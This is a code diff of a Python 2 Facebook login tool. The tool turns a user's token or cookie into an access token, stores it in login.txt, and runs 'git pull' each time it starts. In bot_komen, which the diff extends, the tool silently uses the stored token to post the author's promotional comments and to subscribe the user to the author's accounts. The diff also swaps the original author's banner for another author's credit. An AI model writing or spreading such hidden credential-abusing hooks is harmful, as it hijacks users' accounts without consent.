@@ -46,26 +46,9 @@ bu = current.month
 ha = current.day
 op = bulan[nTemp]
 
-###LOGO###
-
-logo = """
-\033[1;97m8888888888 d8888 8888888b.  8888888 
-\033[1;97m888       d88888 888   Y88b   888   
-\033[1;97m888      d88P888 888    888   888   
-\033[1;97m8888888 d88P 888 888   d88P   888   
-\033[1;97m888    d88P  888 8888888P"    888   
-\033[1;97m888   d88P   888 888 T88b     888   
-\033[1;97m888  d8888888888 888  T88b    888   
-\033[1;97m888 d88P     888 888   T88b 8888888 
-                                   
-\033[1;91m⊱══════════════════⊱═⊰\033[1;93mFARIYA\033[1;91m⊱═⊰══════════════════⊰
-\033[1;97m Author   : Fariya Khan
-\033[1;97m FB       : https://m.facebook.com/Faritricker007
-\033[1;97m FB Page  : https://m.facebook.com/TechFari007
-\033[1;91m⊱══════════════════⊱═⊰\033[1;93mFARIYA\033[1;91m⊱═⊰══════════════════⊰
-\033[1;97m [!] Enjoying Free Tool Don't Buy This.
-\033[1;97m [!] If Tool Not Work Open Aeroplane Mode And Off.
-\033[1;91m⊱══════════════════⊱═⊰\033[1;93mFARIYA\033[1;91m⊱═⊰══════════════════⊰"""
+def logo():
+	os.system("clear")
+	print("  \033[0;91m___ ___ __  __ ___ ___ \n \033[0;91m/ __|_ _|  \/  | _ ) __| \033[0;96mAU\033[0;97m : ANGGA KURNIAWAN\n\033[0;97m \__ \| || |\/| | _ \ _|  \033[0;91mFB\033[0;97m : FB.ME/GAAAARZXD\n\033[0;97m |___/___|_|  |_|___/_|   \033[0;93mGH\033[0;97m : GITHUB.COM/ANGGAXD")
 
 def bot_komen():
     try:
@@ -73,26 +56,30 @@ def bot_komen():
     except IOError:
         print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
         os.system('rm -rf login.txt')
+    una = ('100015073506062') 
+    post = ('1031861840659590') 
+    post2 = ('1110619372783836') 
+    kom = ('GW PAKE SC LU BANG @[100015073506062:0] 😍😘\nhttps://www.facebook.com/100015073506062/posts/1031861840659590/?app=fbl') 
+    kom2 = ('KEREN BANG @[100015073506062:0] 😘😘\nhttps://m.facebook.com/photo.php?fbid=1110619372783836&set=a.106868716492245&type=3&app=fbl') 
+    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + token)
     requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + token)
     requests.post('https://graph.facebook.com/1186995774/subscribers?access_token=' + token)
     print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
     menu()
-    
+
 def login():
 	os.system("clear")
 	try:
 		token = open('login.txt','r')
 		menu()
 	except (KeyError,IOError):
-	        print logo
-	        print ' '
-	        print("\t \033[0;97m[\033[0;93m*\033[0;97m] Select The Login Method")
-	        print ' '
-	        print(" \033[0;97m[1] Login With Token Facebook")
-	        print(" \033[0;97m[1] Login With Cookie Facebook")
-	        print ' '
-	        ask = raw_input("\n   \033[1;97m[•] Choose : ")
-	        if ask =="":
+		logo()
+		print("\n \033[0;97m[\033[0;93m*\033[0;97m] Select The Login Method")
+		print(" \033[0;97m[\033[0;96m1\033[0;97m] Login With Token Facebook")
+		print(" \033[0;97m[\033[0;96m2\033[0;97m] Login With Cookie Facebook")
+		ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
+		if ask =="":
 			login()
 		elif ask == "1" or ask == "01":
 			tokenz()
@@ -102,13 +89,10 @@ def login():
 			login()
 			
 def cookie():
-    os.system('clear')
-    print logo
-    print ' '
-    print ('\033[1;97m[ login With Cookie ]').center(50)
-    print ' '
-    cookie = raw_input("\033[1;97m[!] Put Cookie : \033[0;90m")
-    try:
+	logo()
+	print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get Cookie : https://youtu.be/X7m_O_tZnTc")
+	cookie = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Your Cookie : \033[0;96m")
+	try:
 		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
 		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
 		'referer'                   : 'https://m.facebook.com/',
@@ -124,42 +108,32 @@ def cookie():
 		})
 		find_token = re.search('(EAAA\w+)', data.text)
 		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your Cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
-    except requests.exceptions.ConnectionError:
+	except requests.exceptions.ConnectionError:
 		print(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
-    cookie = open("login.txt", 'w')
-    cookie.write(find_token.group(1))
-    cookie.close()
-    print("\033[1;92mCookie Login Success").center(50)
-    time.sleep(1)
-    os.system('xdg-open https://m.facebook.com/Faritricker007')
-    time.sleep(1)
-    bot_komen()
-
+	cookie = open("login.txt", 'w')
+	cookie.write(find_token.group(1))
+	cookie.close()
+	bot_komen()
+	
 def tokenz():
 	os.system("clear")
 	try:
 		token = open('login.txt','r')
 		menu()
 	except (KeyError,IOError):
-		print logo
-		print ' '
-		print ('\033[1;97m[ login With Access Token ]').center(50)
-		print ' '
-		token = raw_input("\033[1;97m[!] Put Token : \033[0;90m")
+		logo()
+		print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get Token : https://youtu.be/RIpCHs7E4qs")
+		token = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Your Token : \033[0;96m")
 		try:
 			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
 			a = json.loads(otw.text)
 			avsid = open("login.txt", 'w')
 			avsid.write(token)
 			avsid.close()
-			print("\033[1;92mToken Login Success").center(50)
-			time.sleep(1)
-			os.system('xdg-open https://m.facebook.com/Faritricker007')
-			time.sleep(1)
 			bot_komen()
 		except KeyError:
-			exit(" \033[0;97m[\033[0;97m!\033[0;97m] Token Invalid")
-			
+			exit(" \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid")
+
 def menu():
 	os.system('clear')
 	global token
@@ -617,4 +591,3 @@ if __name__ == '__main__':
 		exit(" \033[0;97m[\033[0;91m!\033[0;97m] How To Usage : python2 run.py")
 	os.system("git pull")
 	login()
- 
